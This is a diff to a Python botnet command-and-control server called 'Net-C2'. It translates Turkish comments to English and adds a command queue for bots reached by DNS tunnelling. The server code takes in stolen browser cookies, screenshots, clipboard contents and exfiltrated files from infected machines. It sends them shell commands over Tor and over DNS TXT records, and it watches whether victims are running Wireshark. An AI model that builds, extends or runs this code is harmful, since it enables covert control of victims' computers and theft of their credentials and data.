@@ -74,19 +74,19 @@ class C2Server:
         self.tor_enabled = False
         self.tor_process = None
         self.tor_controller = None
-        self.tor_port = 9050  # Varsayılan Tor portu
+        self.tor_port = 9050  # Default Tor SOCKS5 port
         self.tor_proxy = {
             'http': 'socks5h://127.0.0.1:9050',
             'https': 'socks5h://127.0.0.1:9050'
         }
-        # P2P port aralığı bilgisi (botlara iletilmek için)
+        # P2P port range information (to be communicated to bots)
         self.p2p_port_range = (49152, 65535)
         self.ipv6_enabled = socket.has_ipv6
-        # Güvenlik kuralları ve P2P durumu takibi
+        # Security rules and P2P status tracking
         self.security_rules_enabled = True
-        self.p2p_status = {}  # Bot ID -> P2P durumu
-        self.wireshark_alerts = {}  # Bot ID -> Wireshark uyarıları
-        # Web dashboard ayarları
+        self.p2p_status = {}  # Bot ID -> P2P status
+        self.wireshark_alerts = {}  # Bot ID -> Wireshark alerts
+        # Web Dashboard settings
         self.web_dashboard_enabled = False
         self.web_dashboard_host = '0.0.0.0'
         self.web_dashboard_port = 5500
@@ -99,26 +99,33 @@ class C2Server:
         self.dns_server_thread = None
         self.dns_port = 53
         self.dns_responses = {}  # Query ID -> Response data
-        
-        
-        # Vulnerability Scanner entegrasyonu (Disabled)
+        self.dns_command_queue = {}  # Bot ID -> Command queue for DNS tunnel bots
+        self.dns_chunked_data = {}  # Bot ID -> Chunked data storage
+
+
+        # Vulnerability Scanner integration (Disabled)
         self.vuln_scanner_enabled = False
-        self.bot_vulnerabilities = {}  # Bot ID -> Zafiyet listesi
-        self.platform_stats = {}  # Platform istatistikleri
+        self.bot_vulnerabilities = {}  # Bot ID -> Vulnerability list
+        self.platform_stats = {}  # Platform statistics
         self._init_vuln_scanner()
-        
-        # AI/ML entegrasyonu kaldırıldı (istek üzerine)
+
+        # AI/ML integration removed (upon request)
         self.ai_ml_enabled = False
         self.ai_commands = {}
-        
-        # Network Mapping entegrasyonu
+
+        # Network Mapping integration
         self.network_maps_enabled = True
-        self.network_maps = {}  # Bot ID -> Network map Datas
+        self.network_maps = {}  # Bot ID -> Network map Data
         self.network_maps_dir = "network_maps"
         os.makedirs(self.network_maps_dir, exist_ok=True)
         self._init_network_maps()
-        
-        # Komut geçmişi özellikleri
+
+        # MCP Server settings (default disabled)
+        self.mcp_enabled = False
+        self.mcp_server = None
+        self.mcp_thread = None
+
+        # Command history features
         self.command_history = []
         self.history_file = "command_history.txt"
         self.max_history = 100
@@ -148,7 +155,7 @@ class C2Server:
         try:
             if not self.tor_process:
                 print(term.format("[+] Starting Tor", term.Color.BLUE))
-                # Önce mevcut Tor'a bağlanmayı dene
+                # Try connecting to the existing Tor network first.
                 try:
                     self.tor_controller = Controller.from_port(address="127.0.0.1", port=9051)
                     self.tor_controller.authenticate()
@@ -157,7 +164,7 @@ class C2Server:
                     return True
                 except Exception as ce:
                     print(f"\033[93m[!] Tor Controller connect failed: {ce}\033[0m")
-                    # Kontrol portu yoksa Stem ile Tor'u gerekli ayarlarla başlat
+                    # If control port is not available, start Tor with Stem with the necessary settings
                     try:
                         self.tor_process = launch_tor_with_config(config={
                             'SocksPort': '9050',
@@ -185,11 +192,11 @@ class C2Server:
         try:
             if self.tor_process:
                 print("\033[94m[*] Tor Service Stopping...\033[0m")
-                # Tor'u durdur
+                # Stop Tor
                 self.tor_process.terminate()
                 self.tor_process.wait()
                 self.tor_process = None
-                # Controller'ı kapat
+                # Close Controller
                 try:
                     if self.tor_controller:
                         self.tor_controller.close()
@@ -207,7 +214,7 @@ class C2Server:
     
     def renew_tor_identity(self):
         try:
-            # Stem Controller üzerinden NEWNYM sinyali gönder
+            # Send NEWNYM signal via Stem Controller
             if self.tor_controller is None:
                 try:
                     self.tor_controller = Controller.from_port(address="127.0.0.1", port=9051)
@@ -229,16 +236,16 @@ class C2Server:
             return False
             
         try:
-            # SOCKS5 proxy üzerinden bağlantı kur
+            # Connect via SOCKS5 proxy.
             sock = socks.socksocket()
             sock.set_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
-            sock.settimeout(10)  # 10 saniye timeout
+            sock.settimeout(10)  # 10 second timeout
             sock.connect((host, port))
-            
-            # Veriyi gönder
+
+            # Send data
             sock.send(data)
-            
-            # Yanıt al
+
+            # Receive response
             response = sock.recv(4096)
             sock.close()
             
@@ -261,8 +268,8 @@ class C2Server:
         
         try:
             self.dns_tunnel_domain = domain
-            
-            # DNS Resolver sınıfı
+
+            # DNS Resolver class
             class DNSTunnelResolver(BaseResolver):
                 def __init__(self, c2_server):
                     self.c2 = c2_server
@@ -271,14 +278,14 @@ class C2Server:
                     reply = request.reply()
                     qname = str(request.q.qname).rstrip('.')
                     qtype = request.q.qtype
-                    
-                    # Domain kontrolü
+
+                    # Domain Check
                     if not qname.endswith(self.c2.dns_tunnel_domain):
-                        # Başka domain ise normal DNS response dön
+                        # If another domain, return normal DNS response
                         return reply
                     
                     try:
-                        # Subdomain'den veriyi çıkar
+                        # Extract data from subdomain
                         # Format: <base64_data>.<domain>
                         subdomain = qname.replace(f'.{self.c2.dns_tunnel_domain}', '')
                         
@@ -288,7 +295,7 @@ class C2Server:
                         # Base64 decode
                         try:
                             encoded_data = subdomain.replace('-', '+').replace('_', '/')
-                            # Padding ekle
+                            # Add padding
                             padding = 4 - (len(encoded_data) % 4)
                             if padding != 4:
                                 encoded_data += '=' * padding
@@ -302,7 +309,7 @@ class C2Server:
                             print(f"\033[94m[DNS Tunnel] Received from {bot_data.get('bot_id', 'Unknown')}\033[0m")
                             print(f"  \033[96m•\033[0m Action: {bot_data.get('action', 'unknown')}")
                             
-                            # Bot'u kaydet
+                            # Save bot
                             if bot_data.get('action') == 'dns_tunnel_connect':
                                 bot_id = bot_data.get('bot_id')
                                 with self.c2.lock:
@@ -319,46 +326,83 @@ class C2Server:
                                         self.c2.bots[bot_id]['dns_tunnel'] = True
                                         self.c2.bots[bot_id]['connection_type'] = 'dns_tunnel'
                                         self.c2.bots[bot_id]['last_seen'] = time.time()
+
+                            # Check for commands in queue for this bot
+                            bot_id = bot_data.get('bot_id')
+                            command_payload = None
+                            with self.c2.lock:
+                                if bot_id in self.c2.dns_command_queue and self.c2.dns_command_queue[bot_id]:
+                                    # Get next command from queue
+                                    command = self.c2.dns_command_queue[bot_id].pop(0)
+                                    command_payload = {
+                                        'type': 'command',
+                                        'cmd_id': command.get('id'),
+                                        'command': command.get('command'),
+                                        'timestamp': time.time()
+                                    }
+                                    print(f"\033[95m[DNS Tunnel] Sending command to {bot_id}: {command.get('command')}\033[0m")
                             
-                            # Response hazırla
-                            response_data = {
-                                'status': 'ok',
-                                'timestamp': time.time(),
-                                'message': 'DNS Tunnel active'
-                            }
-                            
-                            # Response'u şifrele ve encode et
+                            # Prepare response with command if available
+                            if command_payload:
+                                response_data = {
+                                    'status': 'ok',
+                                    'timestamp': time.time(),
+                                    'has_command': True,
+                                    'command': command_payload
+                                }
+                            else:
+                                response_data = {
+                                    'status': 'ok',
+                                    'timestamp': time.time(),
+                                    'has_command': False,
+                                    'message': 'No commands pending'
+                                }
+
+                            # Encrypt and encode the response
                             response_json = json.dumps(response_data)
                             encrypted_response = self.c2.encrypt_data(response_json.encode('utf-8'))
                             encoded_response = base64.b64encode(encrypted_response).decode('utf-8')
-                            
-                            # URL-safe yap
+
+                            # Make it URL-safe
                             encoded_response = encoded_response.replace('+', '-').replace('/', '_').replace('=', '')
+
+                            # Handle chunked data for large responses (255 char limit per TXT record)
+                            chunks = []
+                            for i in range(0, len(encoded_response), 200):  # 200 chars per chunk to be safe
+                                chunk = encoded_response[i:i+200]
+                                chunks.append(chunk)
                             
-                            # TXT record olarak dön (255 karakter limiti)
-                            if len(encoded_response) > 255:
-                                encoded_response = encoded_response[:255]
-                            
-                            reply.add_answer(RR(
-                                rname=qname,
-                                rtype=QTYPE.TXT,
-                                rdata=TXT(encoded_response),
-                                ttl=0
-                            ))
+                            # Send first chunk in main response
+                            if chunks:
+                                reply.add_answer(RR(
+                                    rname=qname,
+                                    rtype=QTYPE.TXT,
+                                    rdata=TXT(chunks[0]),
+                                    ttl=0
+                                ))
+                                
+                                # Store remaining chunks for subsequent queries
+                                if len(chunks) > 1:
+                                    self.c2.dns_chunked_data[bot_id] = {
+                                        'chunks': chunks[1:],
+                                        'timestamp': time.time(),
+                                        'total': len(chunks),
+                                        'current': 1
+                                    }
                             
                         except Exception as e:
-                            print(f"\033[91m[DNS Tunnel] Decode error: {e}\033[0m")
+                            print(f"\033[91m[DNS Tunnel] Encode error: {e}\033[0m")
                     
                     except Exception as e:
                         print(f"\033[91m[DNS Tunnel] Error: {e}\033[0m")
                     
                     return reply
-            
-            # DNS Server başlat
+
+            # Start DNS Server
             resolver = DNSTunnelResolver(self)
             self.dns_server = DNSServer(resolver, port=self.dns_port, address='0.0.0.0')
-            
-            # Thread'de başlat
+
+            # Start in a thread
             self.dns_server_thread = threading.Thread(target=self.dns_server.start, daemon=True)
             self.dns_server_thread.start()
             
@@ -397,6 +441,26 @@ class C2Server:
         except Exception as e:
             print(f"\033[91m[!] DNS Tunneling stop error: {e}\033[0m")
             return False
+    
+    def queue_dns_command(self, bot_id, command):
+        """Queue a command for a DNS tunnel bot"""
+        try:
+            with self.lock:
+                if bot_id not in self.dns_command_queue:
+                    self.dns_command_queue[bot_id] = []
+                
+                cmd_entry = {
+                    'id': f"dns_cmd_{int(time.time())}_{len(self.dns_command_queue[bot_id])}",
+                    'command': command,
+                    'timestamp': time.time(),
+                    'status': 'pending'
+                }
+                self.dns_command_queue[bot_id].append(cmd_entry)
+                print(f"\033[94m[DNS Tunnel] Command queued for {bot_id}: {command}\033[0m")
+                return True
+        except Exception as e:
+            print(f"\033[91m[!] DNS command queue error: {e}\033[0m")
+            return False
 
 
     def handle_bot(self, conn, addr):
@@ -428,21 +492,21 @@ class C2Server:
             
             def send_packet(data: bytes):
                 conn.sendall(struct.pack('!I', len(data)) + data)
-            # İlk bağlantıda bot kaydı (framed)
+            # Bot registration (framed) on the first connection
             data = recv_packet()
             if data:
-                # Şifreli veriyi çöz
+                # Decrypt the data
                 decrypted_data = self.decrypt_data(data)
                 message = json.loads(decrypted_data)
                 bot_id = message.get('bot_id')
                 
             
                 with self.lock:
-                    # Gerçek IP'yi kullan, yoksa bağlantı IP'sini kullan
+                    # Use the real IP, otherwise use the connection IP
                     display_ip = message.get('real_ip', bot_ip)
                     self.bots[bot_id] = {
-                        'ip': display_ip,  # Gerçek IP'yi kaydet
-                        'connection_ip': bot_ip,  # Bağlantı IP'sini de sakla
+                        'ip': display_ip,  # Save the real IP
+                        'connection_ip': bot_ip,  # Also save the connection IP
                         'last_seen': time.time(),
                         'conn': conn,
                         'response_received': threading.Event(),
@@ -454,60 +518,60 @@ class C2Server:
                     print(f"\033[94m[+] Bot connected via Tor\033[0m")
                 else:
                     print(f"\033[94m[+] Bot connected via Clearnet\033[0m")
-            
-                # Şifrelenmiş yanıt gönder (P2P port aralığı eklendi)
+
+                # Send encrypted response (P2P port range added)
                 response = json.dumps({
                     'status': 'registered',
                     'p2p_port_range': self.p2p_port_range,
-                    'ipv6_enabled': True  # IPv6 desteği bilgisi
+                    'ipv6_enabled': True  # IPv6 support information
                 }).encode('utf-8')
                 encrypted_response = self.encrypt_data(response)
                 send_packet(encrypted_response)
 
-            # Komut ve yanıt döngüsü
+            # Command and response loop
             while self.active:
                 try:
-                    # Komut gönder
+                    # Send command
                     if not self.command_queue.empty():
                         cmd = self.command_queue.get()
                         if cmd['bot_id'] == bot_id or cmd['bot_id'] == 'broadcast':
-                            # Komutu şifrele
+                            # Encrypt the command
                             command_data = json.dumps(cmd).encode('utf-8')
                             encrypted_command = self.encrypt_data(command_data)
                             
-                            # Tor kontrolü - eğer Tor aktifse ve bot Tor üzerinden bağlıysa
+                            # Tor check - if Tor is active and the bot is connected via Tor...
                             bot_via_tor = self.bots[bot_id].get('tor_enabled', False)
                             if self.tor_enabled and bot_via_tor and SOCKS_AVAILABLE:
                                 print(f"\033[94m[*] Sending command via Tor to {bot_id}\033[0m")
-                                # Gerçek Tor SOCKS5 proxy kullan
+                                # Use real Tor SOCKS5 proxy
                                 try:
-                                    # Bot'un IP ve port bilgisini al
+                                    # Get the bot's IP and port information
                                     bot_ip = self.bots[bot_id].get('ip', addr[0])
-                                    # Tor üzerinden gönder
+                                    # Send via Tor
                                     tor_response = self.send_via_tor(encrypted_command, bot_ip, self.port)
                                     if not tor_response:
-                                        # Tor başarısız olursa normal socket'e geri dön
+                                        # If Tor fails, fall back to normal socket
                                         print(f"\033[93m[*] Tor failed, falling back to clearnet for {bot_id}\033[0m")
                                         send_packet(encrypted_command)
                                 except Exception as e:
                                     print(f"\033[91m[!] Tor send error: {e}\033[0m")
                                     send_packet(encrypted_command)
                             else:
-                                # Normal clearnet üzerinden gönder
+                                # Send over a normal clearnet
                                 if self.tor_enabled and bot_via_tor and not SOCKS_AVAILABLE:
                                     print(f"\033[93m[*] Tor requested but PySocks not available, using clearnet\033[0m")
                                 send_packet(encrypted_command)
                             
                             self.bots[bot_id]['response_received'].clear()
 
-                    # Yanıt al (framed)
+                    # Receive response (framed)
                     conn.settimeout(2)
                     response = recv_packet()
                     if response:
-                        # Şifreli yanıtı çöz
+                        # Decrypt the response
                         decrypted_response = self.decrypt_data(response)
                         response_data = json.loads(decrypted_response)
-                        # Heartbeat ise sadece last_seen güncelle
+                        # Heartbeat only updates last_seen.
                         if response_data.get('action') == 'heartbeat' and bot_id:
                             with self.lock:
                                 if bot_id in self.bots:
@@ -516,16 +580,16 @@ class C2Server:
                         
                         if response_data.get('alert_type') == 'wireshark_status':
                             bot_id = response_data.get('bot_id')
-                            status = "DURDU" if response_data.get('is_active') else "DEVAM EDIYOR"
-                            print(f"\033[91m[!] {bot_id} Wireshark durumu: {status}\033[0m")
-                            continue  # Diğer işlemleri atla
+                            status = "STOPPED" if response_data.get('is_active') else "RUNNING"
+                            print(f"\033[91m[!] {bot_id} Wireshark status: {status}\033[0m")
+                            continue  # Skip other operations
                         
                         elif response_data.get('alert_type') == 'analiz_tespit':
                             bot_id = response_data.get('bot_id')
                             alert_msg = response_data.get('output', 'Unknown alert')
-                            print(f"\033[91m[!] {bot_id} Güvenlik Uyarısı: {alert_msg}\033[0m")
-                            
-                            # Wireshark uyarısını kaydet
+                            print(f"\033[91m[!] {bot_id} Security Alert: {alert_msg}\033[0m")
+
+                            # Save the Wireshark alert
                             with self.lock:
                                 self.wireshark_alerts[bot_id] = {
                                     'timestamp': time.time(),
@@ -537,9 +601,9 @@ class C2Server:
                         elif response_data.get('alert_type') == 'analiz_temiz':
                             bot_id = response_data.get('bot_id')
                             alert_msg = response_data.get('output', 'Analysis tools stopped')
-                            print(f"\033[92m[+] {bot_id} Güvenlik Temizlendi: {alert_msg}\033[0m")
-                            
-                            # Wireshark uyarısını temizle
+                            print(f"\033[92m[+] {bot_id} Security Cleared: {alert_msg}\033[0m")
+
+                            # Clear the Wireshark alert
                             with self.lock:
                                 if bot_id in self.wireshark_alerts:
                                     del self.wireshark_alerts[bot_id]
@@ -548,9 +612,9 @@ class C2Server:
                         elif response_data.get('action') == 'p2p_status':
                             bot_id = response_data.get('bot_id')
                             p2p_status = response_data.get('p2p_status', 'unknown')
-                            print(f"\033[94m[*] {bot_id} P2P Durumu: {p2p_status}\033[0m")
-                            
-                            # P2P durumunu kaydet
+                            print(f"\033[94m[*] {bot_id} P2P Status: {p2p_status}\033[0m")
+
+                            # Save the P2P status
                             with self.lock:
                                 self.p2p_status[bot_id] = {
                                     'status': p2p_status,
@@ -570,21 +634,21 @@ class C2Server:
                             attack_blocked = response_data.get('attack_blocked', False)
                             security_details = response_data.get('security_details', {})
                             
-                            print(f"\033[91m[!] {bot_id} Güvenlik Uyarısı:\033[0m")
-                            print(f"   \033[96m•\033[0m Hedef: {target_ip}")
-                            print(f"   \033[96m•\033[0m Mesaj: {security_message}")
-                            print(f"   \033[96m•\033[0m Saldırı Engellendi: {'Evet' if attack_blocked else 'Hayır'}")
+                            print(f"\033[91m[!] {bot_id} Security Alert:\033[0m")
+                            print(f"   \033[96m•\033[0m Target: {target_ip}")
+                            print(f"   \033[96m•\033[0m Message: {security_message}")
+                            print(f"   \033[96m•\033[0m Attack Blocked: {'Yes' if attack_blocked else 'No'}")
                             
-                            # Güvenlik detaylarını göster
+                            # Show security details
                             if security_details:
-                                print(f"   \033[96m•\033[0m Güvenlik Detayları:")
-                                print(f"     - Firewall: {'Tespit Edildi' if security_details.get('firewall_detected') else 'Tespit Edilmedi'}")
-                                print(f"     - DDoS Koruması: {'Var' if security_details.get('ddos_protection') else 'Yok'}")
-                                print(f"     - WAF: {'Tespit Edildi' if security_details.get('waf_detected') else 'Tespit Edilmedi'}")
-                                print(f"     - Rate Limiting: {'Var' if security_details.get('rate_limiting') else 'Yok'}")
-                                print(f"     - Güvenlik Seviyesi: {security_details.get('security_level', 'Unknown')}")
+                                print(f"   \033[96m•\033[0m Security Details:")
+                                print(f"     - Firewall: {'Detected' if security_details.get('firewall_detected') else 'Not Detected'}")
+                                print(f"     - DDoS Protection: {'Yes' if security_details.get('ddos_protection') else 'No'}")
+                                print(f"     - WAF: {'Detected' if security_details.get('waf_detected') else 'Not Detected'}")
+                                print(f"     - Rate Limiting: {'Yes' if security_details.get('rate_limiting') else 'No'}")
+                                print(f"     - Security Level: {security_details.get('security_level', 'Unknown')}")
                             
-                            # Güvenlik uyarısını kaydet
+                            # Save the security alert
                             with self.lock:
                                 if 'security_alerts' not in self.__dict__:
                                     self.security_alerts = {}
@@ -597,22 +661,28 @@ class C2Server:
                                 }
                             continue
                         
-                        # Heartbeat mesajlarını yoksay (bağlantıyı canlı tutmak için)
+                        # Ignore heartbeat messages (to keep the connection alive)
                         elif response_data.get('action') == 'heartbeat':
                             continue
 
-                        # Komut sonucu (Net.py -> action: 'command_result')
+                            # Command result (Net.py -> action: 'command_result')
                         elif response_data.get('action') == 'command_result':
                             bot_id = response_data.get('bot_id', bot_id)
                             output = response_data.get('output', 'No output')
                             
-                            # processes komutu için özel handling
+                            # Check if there's a pending MCP response waiting for this bot
+                            if hasattr(self, '_mcp_pending_responses') and bot_id in self._mcp_pending_responses:
+                                pending = self._mcp_pending_responses[bot_id]
+                                pending['output'] = output
+                                pending['event'].set()
+                            
+                            # processes command special handling
                             if hasattr(self, '_pending_processes_command') and self._pending_processes_command.get('bot_id') == bot_id:
                                 try:
                                     import json as _json
                                     data = _json.loads(output)
                                     
-                                    # Dosyaya yazdır
+                                    # Write to file
                                     self._save_processes_to_file(bot_id, data)
                                     
                                     print("\n\033[95mProcess Information:\033[0m")
@@ -626,32 +696,32 @@ class C2Server:
                                     print(f"\033[91m[!] Error processing processes info: {str(e)}\033[0m")
                                     print(f"Raw response: {output}")
                                     
-                                    # Hata durumunda da raw response'u dosyaya yaz
+                                    # Also write raw response to file on error
                                     self._save_raw_processes_to_file(bot_id, str(output))
                                     
                                     # Pending command'i temizle
                                     self._pending_processes_command = None
                             else:
-                                # Normal komut sonucu
+                                # Normal command result
                                 print(f"\033[96m{bot_id}\033[0m : {output}")
                             
                             self.bots[bot_id]['response_received'].set()
                             continue
 
-                        # Çerez sonucu: action 'cookies_result' olmalı
+                        # Cookie result: action 'cookies_result'
                         elif response_data.get('action') == 'cookies_result' and response_data.get('status') == 'success':
                             bot_id = response_data.get('bot_id')
                             cookies = response_data.get('cookies', [])
-                            # cookies klasörü yoksa oluştur
+                            # Create cookies folder if not exists
                             os.makedirs("cookies", exist_ok=True)
                             with open(f"cookies/cookie_{bot_id}.txt", "w") as f:
                                 if cookies:
                                     for cookie in cookies:
                                         f.write(f"{cookie['domain']}\t{cookie['name']}\t{cookie['value']}\n")
-                                    print(f"\033[92m[+] {bot_id} çerezleri kaydedildi\033[0m")
+                                    print(f"\033[92m[+] {bot_id} cookies saved\033[0m")
                                 else:
                                     f.write("Cookies are empty")
-                                    print(f"\033[93m[!] {bot_id} çerez bulunamadı\033[0m")
+                                    print(f"\033[93m[!] {bot_id} cookies not found\033[0m")
                         
                         elif response_data.get('action') == 'clipboard_data':
                             bot_id = response_data.get('bot_id', 'unknown')
@@ -667,10 +737,10 @@ class C2Server:
                             filename = response_data.get('filename', 'screenshot.png')
                             img_data = response_data.get('data', '')
                             
-                            # ScreenS klasörünü oluştur
+                            # Create ScreenS folder
                             os.makedirs("ScreenS", exist_ok=True)
                             
-                            # Base64'ten PNG'ye çevir ve kaydet
+                            # Convert from Base64 to PNG and save
                             try:
                                 import base64
                                 img_bytes = base64.b64decode(img_data)
@@ -689,7 +759,7 @@ class C2Server:
                             scope = response_data.get('scope', 'unknown')
                             timestamp = response_data.get('timestamp', time.time())
                             
-                            # Network map verilerini işle ve kaydet
+                            # Network map data processing and saving
                             self._process_network_map(bot_id, network_data, map_format, scope, timestamp)
                             continue
                         
@@ -699,30 +769,30 @@ class C2Server:
                             file_content = response_data.get('file_content', '')
                             
                             try:
-                                # Dosya bilgilerini al
+                                # Get file information
                                 file_name = file_info.get('name', 'unknown_file')
                                 file_path = file_info.get('path', '')
                                 file_size = file_info.get('size', 0)
                                 
-                                # Dosya adını güvenli hale getir
+                                # Make filename safe
                                 safe_filename = "".join(c for c in file_name if c.isalnum() or c in ('.-_')).rstrip()
                                 if not safe_filename:
                                     safe_filename = f"downloaded_file_{int(time.time())}"
                                 
-                                # Server'ın çalıştığı dizine kaydet (downloads/ altına değil)
+                                # Save to server working directory (not in downloads/)
                                 file_full_path = safe_filename
                                 
-                                # Base64 decode et ve kaydet
+                                # Base64 decode and save
                                 file_content_decoded = base64.b64decode(file_content)
                                 with open(file_full_path, 'wb') as f:
                                     f.write(file_content_decoded)
                                 
-                                print(f"\033[92m[+] 📁 Dosya indirildi: {safe_filename}\033[0m")
-                                print(f"  \033[96m•\033[0m Boyut: {file_size:,} bytes")
-                                print(f"  \033[96m•\033[0m Konum: {file_full_path}")
+                                print(f"\033[92m[+] 📁 File downloaded: {safe_filename}\033[0m")
+                                print(f"  \033[96m•\033[0m Size: {file_size:,} bytes")
+                                print(f"  \033[96m•\033[0m Location: {file_full_path}")
                                 print(f"  \033[96m•\033[0m Bot: {bot_id}")
                                 
-                                # İndirme logunu kaydet
+                                # Save download log
                                 download_log = {
                                     'timestamp': time.time(),
                                     'bot_id': bot_id,
@@ -731,7 +801,7 @@ class C2Server:
                                     'file_size': file_size
                                 }
                                 
-                                # Log dosyasına kaydet
+                                # Save to log file
                                 log_file = 'download_log.json'
                                 try:
                                     if os.path.exists(log_file):
@@ -748,7 +818,7 @@ class C2Server:
                                     pass
                                     
                             except Exception as e:
-                                print(f"\033[91m[!] Dosya kaydetme hatası: {str(e)}\033[0m")
+                                print(f"\033[91m[!] File save error: {str(e)}\033[0m")
                             
                             continue
                         
@@ -758,22 +828,22 @@ class C2Server:
                             folder_contents = response_data.get('folder_contents', [])
                             folder_size = response_data.get('folder_size', 0)
                             
-                            print(f"\033[94m[📁] Klasör tespit edildi (Bot: {bot_id})\033[0m")
-                            print(f"  \033[96m•\033[0m Yol: {remote_path}")
-                            print(f"  \033[96m•\033[0m Toplam Boyut: {folder_size:,} bytes")
-                            print(f"  \033[96m•\033[0m İçerik Sayısı: {len(folder_contents)}")
+                            print(f"\033[94m[📁] Folder detected (Bot: {bot_id})\033[0m")
+                            print(f"  \033[96m•\033[0m Path: {remote_path}")
+                            print(f"  \033[96m•\033[0m Total Size: {folder_size:,} bytes")
+                            print(f"  \033[96m•\033[0m Content Count: {len(folder_contents)}")
                             
                             if folder_contents:
-                                print(f"  \033[96m•\033[0m İçerik:")
-                                for item in folder_contents[:10]:  # İlk 10 öğe
+                                print(f"  \033[96m•\033[0m Contents:")
+                                for item in folder_contents[:10]:  # First 10 items
                                     item_type = "📁" if item.get('type') == 'folder' else "📄"
                                     item_size = f"({item.get('size', 0):,} bytes)" if item.get('size') else ""
                                     print(f"    {item_type} {item.get('name', 'Unknown')} {item_size}")
                                 
                                 if len(folder_contents) > 10:
-                                    print(f"    ... ve {len(folder_contents) - 10} öğe daha")
+                                    print(f"    ... and {len(folder_contents) - 10} more items")
                             
-                            print(f"\033[93m[!] Klasörler indirilmez, sadece dosyalar indirilebilir\033[0m")
+                            print(f"\033[93m[!] Folders are not downloaded, only files can be downloaded\033[0m")
                             continue
                         
                         print(f"\033[96m{bot_id}\033[0m : {response_data.get('output', 'No output')}")
@@ -894,7 +964,7 @@ class C2Server:
                 'bot_id': args[0],
                 'command': cmd,
                 'action': 'execute',
-                'silent': True  # Ana konsola çıktı yazılmayacak
+                'silent': True  # No output to main console
             })
             return
 
@@ -908,20 +978,20 @@ class C2Server:
         return True
 
     def encrypt_data(self, data):
-        """Veriyi AES-256-GCM ile şifreler (nonce + ciphertext + tag)"""
+        """Encrypt data using AES-256-GCM (nonce + ciphertext + tag)"""
         if isinstance(data, str):
             data = data.encode('utf-8')
-        # 12 bayt nonce (GCM için önerilen)
+        # 12 byte nonce (recommended for GCM)
         nonce = get_random_bytes(12)
         cipher = AES.new(self.encryption_key, AES.MODE_GCM, nonce=nonce)
         ciphertext, tag = cipher.encrypt_and_digest(data)
-        # nonce + ciphertext + tag olarak birleştir
+        # Combine as nonce + ciphertext + tag
         return nonce + ciphertext + tag
 
     def decrypt_data(self, encrypted_data):
-        """AES-256-GCM ile şifreli veriyi çözer (nonce + ciphertext + tag)"""
+        """Decrypt encrypted data using AES-256-GCM (nonce + ciphertext + tag)"""
         try:
-            # Nonce ilk 12 bayt, tag son 16 bayt
+            # Nonce is first 12 bytes, tag is last 16 bytes
             if len(encrypted_data) < 12 + 16:
                 raise ValueError("Encrypted payload too short")
             nonce = encrypted_data[:12]
@@ -931,7 +1001,7 @@ class C2Server:
             decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
             return decrypted_data.decode('utf-8')
         except Exception as e:
-            # Eski format (CBC) için geriye dönük uyumluluk
+            # Backward compatibility for old format (CBC)
             try:
                 iv = encrypted_data[:16]
                 actual_data = encrypted_data[16:]
@@ -951,13 +1021,13 @@ class C2Server:
                 'bot_id': bot_id,
                 'command': command,
                 'action': 'execute',
-                'silent': True  # Ana konsola çıktı yazılmayacak
+                'silent': True  # No output to main console
             })
             return True
             
         # Legacy inline 'upload' handling removed. Use handle_command('upload ...') path only.
                 
-        # Eğer gelen komut tanımlı değilse, doğrudan bot'a gönder
+                # If command is not defined, send directly to bot
         self.command_queue.put({
             'bot_id': bot_id,
             'command': command,
@@ -999,18 +1069,18 @@ class C2Server:
             try:
                 cmd = input("\033[1;36mNet-C2>\033[0m ").strip()
                 
-                # Komut geçmişine ekle
+                # Add command to history
                 self._add_to_history(cmd)
                 
                 if not cmd:
                     print()
                     continue
                 
-                # Help kontrolü - console loop için
+                # Help check - for console loop
                 parts = cmd.split()
                 if len(parts) >= 2 and parts[-1] == '?':
                     main_cmd = parts[0].lower()
-                    # Tüm help sistemindeki komutları kontrol et
+                    # Check all commands in help system
                     help_commands = ['cmd', 'upload', 'download', 'list', 'server', 'security', 'alerts', 
                                'processes', 'keylogger', 'clipboard', 'tor', 'dns_tunnel', 'web', 
                                'show', 'broadcast', 'clear', 'exit', 'help', 'network_map',
@@ -1027,11 +1097,11 @@ class C2Server:
                             
                         print("\n\033[95mActive Bots:\033[0m")
                         for bot_id, bot in self.bots.items():
-                            # Bot durumu bilgilerini al
+                            # Get bot status information
                             p2p_status = self.p2p_status.get(bot_id, {}).get('status', 'unknown')
                             has_alert = bot_id in self.wireshark_alerts
                             
-                            # Durum ikonları
+                            # Status icons
                             p2p_icon = "🟢" if p2p_status == 'active' else "🔴" if p2p_status == 'stopped' else "⚪"
                             alert_icon = "⚠️" if has_alert else "✅"
                             
@@ -1097,7 +1167,7 @@ class C2Server:
                         if not self.wireshark_alerts and not hasattr(self, 'security_alerts'):
                             print("  \033[92m[+] No security alerts\033[0m")
                         else:
-                            # Wireshark uyarıları
+                            # Wireshark alerts
                             if self.wireshark_alerts:
                                 print("  \033[94m[*] Wireshark Alerts:\033[0m")
                                 for bot_id, alert_info in self.wireshark_alerts.items():
@@ -1105,7 +1175,7 @@ class C2Server:
                                     timestamp = time.ctime(alert_info['timestamp'])
                                     print(f"    \033[91m•\033[0m {bot_id}: {message} \033[90m({timestamp})\033[0m")
                             
-                            # Güvenlik uyarıları
+                            # Security alerts
                             if hasattr(self, 'security_alerts') and self.security_alerts:
                                 print("  \033[94m[*] Security Alerts:\033[0m")
                                 for bot_id, alert_info in self.security_alerts.items():
@@ -1154,16 +1224,16 @@ class C2Server:
                         continue
                     bot_id = parts[1]
                     
-                    # Bot'un var olup olmadığını kontrol et
+                    # Check if bot exists
                     with self.lock:
                         if bot_id not in self.bots:
                             print(f"\033[93m[!] Bot not found: {bot_id}\033[0m")
                             continue
                     
-                    # Pending command'i işaretle
+                    # Mark pending command
                     self._pending_processes_command = {'bot_id': bot_id}
                     
-                    # Komutu gönder
+                    # Send command
                     result = self.send_command(bot_id, 'processes')
                     if result is False:
                         print(f"\033[93m[!] Failed to send command to bot: {bot_id}\033[0m")
@@ -1214,23 +1284,26 @@ class C2Server:
                     print("  \033[96m•\033[0m download <ID> <RPATH> - Download Files from Bot")
                     print("  \033[96m•\033[0m cookies <ID> - Steals Browser Cookies")
                     print("  \033[96m•\033[0m server       - Show Server Information")
-                    print("  \033[96m•\033[0m tor help    - Show Tor c=Command Help")
+                    print("  \033[96m•\033[0m tor help    - Show Tor Command Help")
                     print("  \033[96m•\033[0m tor enable  - Starting Tor Server")
                     print("  \033[96m•\033[0m tor disable - Stopping Tor Server")
                     print("  \033[96m•\033[0m tor renew   - Renew Tor Identity")
                     print("  \033[96m•\033[0m tor status  - Show Tor Status")
                     print("  \033[96m•\033[0m tor bots    - Show Tor Connected Bots")
